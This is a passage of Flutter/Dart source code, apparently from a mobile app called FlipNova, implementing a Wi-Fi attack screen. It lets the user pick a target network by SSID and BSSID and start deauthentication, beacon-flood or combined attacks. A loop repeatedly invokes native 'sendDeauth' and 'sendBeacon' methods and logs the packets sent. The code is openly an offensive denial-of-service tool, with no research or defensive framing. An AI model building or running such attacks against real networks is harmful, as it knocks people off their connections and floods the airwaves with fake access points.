            decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: FlipNovaTheme.red, width: FlipNovaTheme.borderWidth)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('TARGET: ${widget.ssid}', style: FlipNovaTheme.mono(color: FlipNovaTheme.red, fontSize: 12, weight: FontWeight.bold)),
              const SizedBox(height: 4),
              Text('BSSID: ${widget.bssid} | CH:${widget.channel}', style: FlipNovaTheme.mono(color: FlipNovaTheme.gray, fontSize: 10)),
            ]),
          ),
          const SizedBox(height: 12),
          Text('ATTACK TYPE:', style: FlipNovaTheme.mono(color: FlipNovaTheme.cyan, fontSize: 10, weight: FontWeight.bold)),
          const SizedBox(height: 8),
          Row(children: [
            _buildAttackTypeButton('DEAUTH', 'Deauth frames\ndisconnect clients'),
            const SizedBox(width: 8),
            _buildAttackTypeButton('BEACON', 'Beacon flood\nfake AP spam'),
            const SizedBox(width: 8),
            _buildAttackTypeButton('COMBO', 'Deauth + Beacon\ncombined attack'),
          ]),
          const SizedBox(height: 12),
          if (_isAttacking) ...[
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: FlipNovaTheme.red, width: FlipNovaTheme.borderWidth)),
              child: Row(mainAxisAlignment: MainAxisAlignment.spaceAround, children: [
                _buildCounter('PACKETS', _packetCount, FlipNovaTheme.cyan),
                _buildCounter(_selectedAttack, 0, FlipNovaTheme.red),
                _buildCounter('STATUS', _isSending ? 1 : 0, FlipNovaTheme.green),
              ]),
            ),
            const SizedBox(height: 12),
          ],
          Row(children: [
            Expanded(child: ElevatedButton(
              onPressed: _isAttacking ? null : _startAttack,
              style: ElevatedButton.styleFrom(backgroundColor: FlipNovaTheme.bgCard, foregroundColor: FlipNovaTheme.red, side: const BorderSide(color: FlipNovaTheme.red, width: FlipNovaTheme.borderWidth), padding: const EdgeInsets.symmetric(vertical: 14)),
              child: Text(_isAttacking ? '[ ATTACKING... ]' : '[ START ATTACK ]'),
            )),
            if (_isAttacking) ...[
              const SizedBox(width: 8),
              Expanded(child: ElevatedButton(
                onPressed: _stopAttack,
                style: ElevatedButton.styleFrom(backgroundColor: FlipNovaTheme.bgCard, foregroundColor: FlipNovaTheme.white, side: const BorderSide(color: FlipNovaTheme.white, width: FlipNovaTheme.borderWidth), padding: const EdgeInsets.symmetric(vertical: 14)),
                child: const Text('[ STOP ]'),
              )),
            ],
          ]),
          const SizedBox(height: 12),
          Expanded(child: Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: FlipNovaTheme.border, width: FlipNovaTheme.borderWidth)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('OUTPUT:', style: FlipNovaTheme.mono(color: FlipNovaTheme.red, fontSize: 10, weight: FontWeight.bold)),
              const SizedBox(height: 8),
              Expanded(child: ListView(children: _attackLog.reversed.map((l) => Text(l, style: FlipNovaTheme.mono(color: l.contains('OK') || l.contains('SENT') ? FlipNovaTheme.green : FlipNovaTheme.gray, fontSize: 10))).toList())),
            ]),
          )),
        ]),
      ),
    );
  }

  Widget _buildAttackTypeButton(String type, String desc) {
    final isSelected = _selectedAttack == type;
    return Expanded(child: GestureDetector(
      onTap: () => setState(() => _selectedAttack = type),
      child: Container(
        padding: const EdgeInsets.all(8),
        decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: isSelected ? FlipNovaTheme.red : FlipNovaTheme.gray, width: FlipNovaTheme.borderWidth)),
        child: Column(children: [
          Text(type, style: FlipNovaTheme.mono(color: isSelected ? FlipNovaTheme.red : FlipNovaTheme.gray, fontSize: 10, weight: FontWeight.bold)),
          const SizedBox(height: 4),
          Text(desc, style: FlipNovaTheme.mono(color: FlipNovaTheme.gray, fontSize: 8), textAlign: TextAlign.center),
        ]),
      ),
    ));
  }

  Widget _buildCounter(String label, int value, Color color) {
    return Column(children: [
      Text('$value', style: FlipNovaTheme.mono(color: color, fontSize: 16, weight: FontWeight.bold)),
      Text(label, style: FlipNovaTheme.mono(color: FlipNovaTheme.gray, fontSize: 8)),
    ]);
  }

  void _startAttack() {
    setState(() { _isAttacking = true; _packetCount = 0; _attackLog.clear(); _attackLog.add('> Starting $_selectedAttack on ${widget.ssid}...'); });
    _runAttack();
  }

  Future<void> _runAttack() async {
    while (_isAttacking && mounted) {
      if (_selectedAttack == 'DEAUTH' || _selectedAttack == 'COMBO') {
        try {
          if (mounted) setState(() => _isSending = true);
          final result = await _channel.invokeMethod<Map>('sendDeauth', {'bssid': widget.bssid, 'channel': widget.channel});
          final sent = result?['sent'] ?? 0;
          if (mounted) setState(() {
            _packetCount += (sent as int);
            _attackLog.add('> [DEAUTH] Sent $sent frames to ${widget.bssid}');
            _isSending = false;
          });
        } catch (e) {
          if (mounted) setState(() { _attackLog.add('> [DEAUTH] Error: $e'); _isSending = false; });
        }
      }

      if (_selectedAttack == 'BEACON' || _selectedAttack == 'COMBO') {
        try {
          if (mounted) setState(() => _isSending = true);
          final result = await _channel.invokeMethod<Map>('sendBeacon', {'ssid': widget.ssid});
          final sent = result?['sent'] ?? 0;
          if (mounted) setState(() {
            _packetCount += (sent as int);
            _attackLog.add('> [BEACON] Flooded $sent beacons');
            _isSending = false;
          });
        } catch (e) {
          if (mounted) setState(() { _attackLog.add('> [BEACON] Error: $e'); _isSending = false; });
        }
      }

      await Future.delayed(const Duration(milliseconds: 500));
    }
  }

  void _stopAttack() { setState(() { _isAttacking = false; _attackLog.add('> Attack stopped. Total: $_packetCount packets sent.'); }); }
}
